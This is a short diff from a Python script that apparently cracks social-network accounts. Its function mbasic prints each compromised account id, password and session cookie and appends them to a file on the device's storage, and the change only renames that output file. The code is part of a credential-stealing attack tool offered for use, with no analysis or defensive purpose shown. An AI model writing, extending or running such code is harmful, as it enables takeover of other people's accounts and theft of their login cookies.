@@ -1366,7 +1366,7 @@ def mbasic(uid,pwx,tl):
                     else:
                         print(f"{green}(ATOM-NV) {cid}|{pw}")
                         print(f"{green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        open("/sdcard/ATOM-confirmemail.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         oks.append(cid)
                         break
                 else:
